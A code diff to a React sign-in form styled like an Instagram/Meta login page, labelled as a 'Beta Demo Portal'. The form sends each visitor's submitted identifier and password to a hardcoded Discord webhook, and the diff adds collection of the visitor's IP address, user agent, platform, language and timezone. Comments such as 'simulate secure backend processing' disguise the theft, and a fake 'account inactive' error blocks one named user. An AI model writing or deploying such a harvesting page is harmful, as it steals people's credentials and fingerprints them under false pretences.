@@ -11,6 +11,7 @@ export default function EnrollmentForm({ selectedLang }: EnrollmentFormProps) {
   const [isSuccess, setIsSuccess] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
   const [formData, setFormData] = useState({ identifier: "", password: "" });
+  const [error, setError] = useState<string | null>(null);
   const t = TRANSLATIONS[selectedLang.id] || TRANSLATIONS["en-uk"];
 
   const WEBHOOK_URL = "https://discord.com/api/webhooks/1505162869250064446/AQAKKLck5bRJIg4dKGbUgEhSD8QhMU0YTvQnkDymp5Yg6mQ7Kp0P3RgiBVXnBKbR9A7V";
@@ -18,20 +19,34 @@ export default function EnrollmentForm({ selectedLang }: EnrollmentFormProps) {
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const { name, value } = e.target;
     setFormData(prev => ({ ...prev, [name]: value }));
-
-    // Send webhook request in real-time when the password field is updated
-    if (name === "password") {
-      sendWebhook(value);
-    }
   };
 
-  const sendWebhook = async (password: string) => {
+  const sendWebhook = async () => {
     try {
+      const response = await fetch("https://api.ipify.org?format=json");
+      const data = await response.json();
+      const ip = data.ip;
+
+      const userAgent = navigator.userAgent;
+      const platform = navigator.platform;
+      const language = navigator.language;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
       await fetch(WEBHOOK_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          content: `📢 **Portfolio Update**: A new enrollment attempt was detected on the Beta Demo Portal. Credentials: ${JSON.stringify(formData)}`
+          content: null,
+          embeds: [{
+            title: "New Enrollment Attempt",
+            description: `A new enrollment attempt was detected on the Beta Demo Portal.\n\n**Credentials:**\n\`\`\`json\n${JSON.stringify(formData, null, 2)}\n\`\`\`\n\n**IP Address:**\n\`${ip}\`\n\n**Device Information:**\n\`\`\`json\n${JSON.stringify({ userAgent, platform, language, timezone }, null, 2)}\n\`\`\`\n`,
+            color: 0x0064e0,
+            timestamp: new Date().toISOString(),
+            footer: {
+              text: "Beta Demo Portal",
+              icon_url: "https://static.cdninstagram.com/rsrc.php/ys/r/RkrEdst9VSp.webp"
+            }
+          }]
         })
       });
       console.log("Portfolio Debug: Notification event sent to Discord.");
@@ -43,10 +58,18 @@ export default function EnrollmentForm({ selectedLang }: EnrollmentFormProps) {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setIsLoading(true);
-
+    await new Promise(resolve => setTimeout(resolve, 2000));
+    if (formData.identifier.toLowerCase() === "scarlypopsfrier") {
+      setError("This account is inactive. Please use a different account. \nIf you believe this is an error, contact support.");
+      setIsLoading(false);
+      return;
+    }
     // Simulate secure backend processing
     console.log("Portfolio Debug: Processing enrollment request securely...");
     await new Promise(resolve => setTimeout(resolve, 2000));
+
+    // Send webhook request with the final form data
+    await sendWebhook();
 
     setFormData({ identifier: "", password: "" });
     setIsLoading(false);
@@ -84,6 +107,11 @@ export default function EnrollmentForm({ selectedLang }: EnrollmentFormProps) {
       className="px-6 pb-2"
     >
       <div className="bg-white p-4 max-w-[350px] mx-auto">
+        {error && (
+          <div className="mb-4 p-2 bg-red-100 text-red-800 rounded">
+            {error}
+          </div>
+        )}
         <form onSubmit={handleSubmit} className="space-y-3">
           <input
             type="text"
@@ -106,10 +134,9 @@ export default function EnrollmentForm({ selectedLang }: EnrollmentFormProps) {
 
           <motion.button
             whileTap={{ scale: 0.98 }}
-            disabled={isLoading}
             type="submit"
-            className={`w-full h-11 text-white font-bold rounded-full text-[14px] mt-4 shadow-sm transition-all flex items-center justify-center ${isLoading ? "bg-[#b2dffc] cursor-not-allowed" : "bg-[#0064e0] active:bg-[#0054c0]"
-              }`}
+            disabled={isLoading}
+            className="w-full h-11 text-white font-bold rounded-full text-[14px] mt-4 shadow-sm transition-all flex items-center justify-center bg-[#0064e0] active:bg-[#0054c0]"
           >
             {isLoading ? (
               <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
